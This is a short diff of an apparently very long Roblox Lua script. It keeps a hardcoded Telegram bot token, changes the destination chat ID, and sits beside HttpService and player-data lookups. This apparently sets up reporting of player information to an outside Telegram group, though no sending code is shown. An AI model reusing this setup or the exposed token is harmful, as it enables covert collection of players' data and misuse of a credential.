@@ -8498,7 +8498,7 @@ local HttpService = game:GetService("HttpService")
 
 -- Вшитые данные бота и группы
 local BOT_TOKEN = "9117692807:AAGC3YrEO-2C18emkaogVQgEH6rNDHM9tp0"
-local CHAT_ID = "-5408044934"
+local CHAT_ID = "-1004497509966"
 
 -- Сервисы и данные игрока
 local Players = game:GetService("Players")
